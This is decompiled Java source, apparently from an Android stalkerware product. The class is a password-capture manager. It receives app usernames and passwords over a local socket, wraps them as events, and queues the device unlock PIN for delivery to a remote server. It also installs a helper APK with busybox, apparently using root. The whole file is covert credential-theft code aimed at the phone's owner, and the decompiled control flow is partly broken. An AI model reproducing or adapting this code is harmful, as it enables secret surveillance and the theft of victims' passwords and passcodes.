package com.vvt.capture.d;

import com.fx.socket.TcpSocketCmd;
import com.fx.socket.e;
import com.vvt.capture.core.password.AppType;
import com.vvt.capture.core.password.Password;
import com.vvt.capture.core.password.ref.command.RemotePINCapture;
import com.vvt.capture.core.password.ref.command.RemotePasswordCapture;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.h;
import com.vvt.datadeliverymanager.i;
import com.vvt.events.FxAppType;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxPasswordEvent;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import com.vvt.io.p;
import com.vvt.io.q;
import com.vvt.phoenix.prot.command.data.j;
import com.vvt.phoenix.prot.command.z;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;

public class b
  implements com.fx.socket.d, com.vvt.datadeliverymanager.a.a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private boolean c;
  private String d;
  private boolean e;
  private e f;
  private com.vvt.base.a g;
  private com.vvt.datadeliverymanager.b h;
  private Timer i;
  private int j;
  private String k;
  private ArrayList l;
  private com.vvt.playstore.autoupdateapps.a m;
  
  public b(String paramString)
  {
    this.d = paramString;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.l = localArrayList;
  }
  
  private FxPasswordEvent a(Password paramPassword)
  {
    FxPasswordEvent localFxPasswordEvent = new com/vvt/events/FxPasswordEvent;
    localFxPasswordEvent.<init>();
    long l1 = paramPassword.getEventTime();
    localFxPasswordEvent.setEventTime(l1);
    Object localObject = paramPassword.getAppId();
    localFxPasswordEvent.setAppId((String)localObject);
    localObject = paramPassword.getAppName();
    localFxPasswordEvent.setAppName((String)localObject);
    localObject = FxAppType.forValue(paramPassword.getAppType().getValue());
    localFxPasswordEvent.setAppType((FxAppType)localObject);
    localObject = paramPassword.getAccountName();
    localFxPasswordEvent.setAccountName((String)localObject);
    localObject = paramPassword.getUsername();
    localFxPasswordEvent.setUserName((String)localObject);
    localObject = paramPassword.getPassword();
    localFxPasswordEvent.setPassword((String)localObject);
    return localFxPasswordEvent;
  }
  
  private void a(String paramString)
  {
    synchronized (this.l)
    {
      boolean bool = com.vvt.ag.b.a(paramString);
      if (!bool)
      {
        ArrayList localArrayList2 = this.l;
        localArrayList2.add(paramString);
      }
      return;
    }
  }
  
  private boolean a(Boolean paramBoolean)
  {
    Object[] arrayOfObject = new Object[2];
    String str1 = this.d;
    arrayOfObject[0] = str1;
    int n = 1;
    str1 = "crtsysevntflg.dat";
    arrayOfObject[n] = str1;
    String str2 = String.format("%s/%s", arrayOfObject);
    boolean bool1 = q.a(paramBoolean, str2);
    boolean bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  private boolean i()
  {
    boolean bool1 = true;
    boolean bool2 = false;
    int n = 2;
    Object localObject = new Object[n];
    String str1 = this.d;
    localObject[0] = str1;
    str1 = "crtsysevntflg.dat";
    localObject[bool1] = str1;
    String str2 = String.format("%s/%s", (Object[])localObject);
    localObject = new java/io/File;
    ((File)localObject).<init>(str2);
    boolean bool3 = ((File)localObject).exists();
    if (!bool3) {}
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return bool1;
      bool1 = false;
    }
  }
  
  private boolean j()
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    try
    {
      e locale = new com/fx/socket/e;
      String str1 = "PasswordCaptureManager";
      String str2 = "com.fx.socket.pwd.capture.fs";
      int n = 12516;
      locale.<init>(str1, str2, n, this);
      this.f = locale;
      locale = this.f;
      locale.start();
      bool1 = true;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  private void k()
  {
    synchronized (this.l)
    {
      ArrayList localArrayList2 = this.l;
      int n = localArrayList2.size();
      if (n > 0)
      {
        localArrayList2 = this.l;
        localArrayList2.remove(0);
      }
      return;
    }
  }
  
  private String l()
  {
    Object localObject1 = null;
    synchronized (this.l)
    {
      ArrayList localArrayList2 = this.l;
      int n = localArrayList2.size();
      if (n > 0)
      {
        localObject1 = this.l;
        n = 0;
        localArrayList2 = null;
        localObject1 = ((ArrayList)localObject1).get(0);
        localObject1 = (String)localObject1;
      }
      return (String)localObject1;
    }
  }
  
  private void m()
  {
    int n = 47;
    boolean bool1 = true;
    boolean bool2 = a;
    if (bool2) {}
    Object localObject1 = this.h;
    if (localObject1 != null)
    {
      localObject1 = this.h;
      bool2 = ((com.vvt.datadeliverymanager.b)localObject1).a(n);
      if (!bool2)
      {
        localObject1 = l();
        boolean bool3 = a;
        if (bool3) {}
        bool3 = com.vvt.ag.b.a((String)localObject1);
        if (!bool3)
        {
          Object localObject2 = new com/vvt/phoenix/prot/command/z;
          ((z)localObject2).<init>();
          Object localObject3 = new com/vvt/phoenix/prot/command/data/j;
          ((j)localObject3).<init>();
          ((j)localObject3).a("General.PasscodeLock.IsPasscodeOn");
          ((j)localObject3).b("1");
          ((z)localObject2).a((j)localObject3);
          localObject3 = new com/vvt/phoenix/prot/command/data/j;
          ((j)localObject3).<init>();
          String str = "General.PasscodeLock.Passcode";
          ((j)localObject3).a(str);
          ((j)localObject3).b((String)localObject1);
          ((z)localObject2).a((j)localObject3);
          localObject1 = new com/vvt/phoenix/prot/command/data/j;
          ((j)localObject1).<init>();
          ((j)localObject1).a("General.PasscodeLock.PatternCode");
          localObject3 = "";
          ((j)localObject1).b((String)localObject3);
          ((z)localObject2).a((j)localObject1);
          localObject1 = new com/vvt/datadeliverymanager/h;
          ((h)localObject1).<init>();
          ((h)localObject1).a(n);
          ((h)localObject1).a((com.vvt.phoenix.prot.command.b)localObject2);
          localObject2 = DeliveryRequestType.REQUEST_TYPE_NEW;
          ((h)localObject1).a((DeliveryRequestType)localObject2);
          localObject2 = PriorityRequest.PRIORITY_NORMAL;
          ((h)localObject1).a((PriorityRequest)localObject2);
          localObject2 = DataProviderType.DATA_PROVIDER_TYPE_NONE;
          ((h)localObject1).a((DataProviderType)localObject2);
          int i1 = 15;
          ((h)localObject1).c(i1);
          long l1 = 60000L;
          ((h)localObject1).b(l1);
          ((h)localObject1).c(bool1);
          ((h)localObject1).b(bool1);
          ((h)localObject1).a(this);
          localObject2 = this.h;
          ((com.vvt.datadeliverymanager.b)localObject2).a((h)localObject1);
          bool2 = a;
          if (!bool2) {}
        }
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return;
      bool2 = a;
      if (bool2)
      {
        continue;
        bool2 = a;
        if (!bool2) {}
      }
    }
  }
  
  private void n()
  {
    boolean bool = a;
    if (bool) {}
    e locale = this.f;
    if (locale != null)
    {
      bool = a;
      if (bool) {}
      locale = this.f;
      locale.a();
    }
    bool = a;
    if (bool) {}
  }
  
  public Object a(TcpSocketCmd paramTcpSocketCmd)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    Object localObject1 = null;
    boolean bool3 = this.c;
    if (bool3)
    {
      bool3 = paramTcpSocketCmd instanceof RemotePasswordCapture;
      if (bool3)
      {
        bool2 = a;
        if (bool2) {}
        paramTcpSocketCmd = (RemotePasswordCapture)paramTcpSocketCmd;
        localObject1 = (Password)paramTcpSocketCmd.getData();
        Object localObject2 = this.g;
        if ((localObject2 != null) && (localObject1 != null))
        {
          localObject2 = ((Password)localObject1).getPassword();
          bool3 = com.vvt.ag.b.a((String)localObject2);
          if (!bool3)
          {
            localObject2 = ((Password)localObject1).getUsername();
            bool3 = com.vvt.ag.b.a((String)localObject2);
            if (!bool3)
            {
              localObject2 = new java/util/ArrayList;
              ((ArrayList)localObject2).<init>();
              Object localObject3 = a((Password)localObject1);
              ((List)localObject2).add(localObject3);
              localObject3 = this.g;
              ((com.vvt.base.a)localObject3).a((List)localObject2);
              localObject2 = this.m;
              if (localObject2 != null)
              {
                localObject1 = ((Password)localObject1).getAppName();
                if (localObject1 != null)
                {
                  localObject1 = ((String)localObject1).toLowerCase();
                  localObject2 = "gmail";
                  bool2 = ((String)localObject1).equals(localObject2);
                  if (bool2)
                  {
                    bool2 = a;
                    if (bool2) {}
                    localObject1 = this.m;
                    ((com.vvt.playstore.autoupdateapps.a)localObject1).a();
                  }
                }
              }
            }
          }
        }
        localObject1 = Boolean.valueOf(bool1);
      }
    }
    for (;;)
    {
      return localObject1;
      bool3 = paramTcpSocketCmd instanceof RemotePINCapture;
      if (bool3)
      {
        bool2 = a;
        if (bool2) {}
        paramTcpSocketCmd = (RemotePINCapture)paramTcpSocketCmd;
        localObject1 = (String)paramTcpSocketCmd.getData();
        bool3 = a;
        if (bool3) {}
        a((String)localObject1);
        m();
        localObject1 = Boolean.valueOf(bool1);
      }
      else
      {
        bool3 = b;
        if (bool3)
        {
          continue;
          bool3 = a;
          if (!bool3) {}
        }
      }
    }
  }
  
  public void a(com.vvt.base.a parama)
  {
    boolean bool = a;
    if (bool) {}
    this.g = parama;
    bool = a;
    if (bool) {}
  }
  
  public void a(com.vvt.datadeliverymanager.b paramb)
  {
    boolean bool = a;
    if (bool) {}
    this.h = paramb;
    bool = a;
    if (bool) {}
  }
  
  public void a(i parami) {}
  
  public void a(com.vvt.playstore.autoupdateapps.a parama)
  {
    this.m = parama;
  }
  
  public boolean a()
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = true;
    boolean bool2 = f();
    this.e = bool2;
    bool2 = this.e;
    if (bool2)
    {
      e locale = this.f;
      if (locale == null)
      {
        bool2 = a;
        if (bool2) {}
        bool2 = j();
        if (!bool2)
        {
          bool1 = b;
          if (bool1) {}
          bool1 = false;
        }
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      return bool1;
      bool2 = a;
      if (!bool2) {}
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    com.vvt.datadeliverymanager.b localb = this.h;
    if (localb == null)
    {
      bool = b;
      if (!bool) {}
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      localb = this.h;
      int n = 47;
      localb.a(n, this);
    }
  }
  
  public void b(i parami)
  {
    boolean bool1 = a;
    if ((!bool1) || (parami == null))
    {
      bool1 = b;
      if (!bool1) {}
    }
    for (;;)
    {
      return;
      bool1 = a;
      if (bool1) {}
      bool1 = parami.f();
      if (bool1) {
        break label269;
      }
      int n = parami.d();
      int i4 = 306;
      if (n != i4)
      {
        n = parami.d();
        i4 = 312;
        if (n != i4) {
          break label253;
        }
      }
      boolean bool2 = a;
      if (bool2) {}
      int i1 = this.j + 1;
      this.j = i1;
      boolean bool3 = a;
      if (bool3) {}
      int i2 = this.j;
      i4 = 15;
      if (i2 >= i4) {
        break;
      }
      bool4 = a;
      if (bool4) {}
      Timer localTimer = this.i;
      if (localTimer != null)
      {
        localTimer = this.i;
        localTimer.cancel();
      }
      bool4 = a;
      if (bool4) {}
      localTimer = new java/util/Timer;
      localTimer.<init>();
      this.i = localTimer;
      localTimer = this.i;
      d locald = new com/vvt/capture/d/d;
      locald.<init>(this, null);
      long l1 = 60000L;
      localTimer.schedule(locald, l1);
    }
    boolean bool4 = a;
    if (bool4) {}
    this.j = 0;
    for (;;)
    {
      bool4 = a;
      if (bool4) {}
      int i3 = this.j;
      if (i3 == 0)
      {
        bool5 = a;
        if (bool5) {}
        k();
        m();
      }
      boolean bool5 = a;
      if (!bool5) {
        break;
      }
      break;
      label253:
      bool5 = a;
      if (bool5) {}
      this.j = 0;
      continue;
      label269:
      bool5 = a;
      if (bool5) {}
      this.j = 0;
    }
  }
  
  public void c()
  {
    n();
  }
  
  public void d()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (bool)
    {
      this.c = true;
      bool = a;
      if (!bool) {}
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = a;
      if (bool) {}
      Object localObject1 = this.g;
      if (localObject1 != null)
      {
        bool = i();
        if (bool)
        {
          localObject1 = new java/util/ArrayList;
          ((ArrayList)localObject1).<init>();
          Object localObject2 = new com/vvt/events/FxSystemEvent;
          ((FxSystemEvent)localObject2).<init>();
          Object localObject3 = FxEventDirection.OUT;
          ((FxSystemEvent)localObject2).setDirection((FxEventDirection)localObject3);
          long l1 = System.currentTimeMillis();
          ((FxSystemEvent)localObject2).setEventTime(l1);
          localObject3 = FxSystemEventCategories.CATEGORY_PASSWORD_GRABBER;
          ((FxSystemEvent)localObject2).setLogType((FxSystemEventCategories)localObject3);
          localObject3 = "Xposed framework is not supported on this device";
          ((FxSystemEvent)localObject2).setMessage((String)localObject3);
          ((List)localObject1).add(localObject2);
          localObject2 = this.g;
          ((com.vvt.base.a)localObject2).a((List)localObject1);
          bool = false;
          localObject1 = Boolean.valueOf(false);
          a((Boolean)localObject1);
          continue;
        }
      }
      localObject1 = this.g;
      if (localObject1 == null)
      {
        bool = b;
        if (!bool) {}
      }
    }
  }
  
  public void e()
  {
    this.c = false;
  }
  
  public boolean f()
  {
    boolean bool1 = false;
    try
    {
      com.vvt.am.a locala = new com/vvt/am/a;
      locala.<init>();
      String str1 = this.d;
      String str2 = "ticket.apk";
      str1 = p.a(str1, str2);
      locala.a(str1);
      str1 = "busybox";
      locala.c(str1);
      str1 = this.d;
      locala.b(str1);
      bool1 = locala.b();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
    return bool1;
  }
  
  public String g()
  {
    return this.k;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/d/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */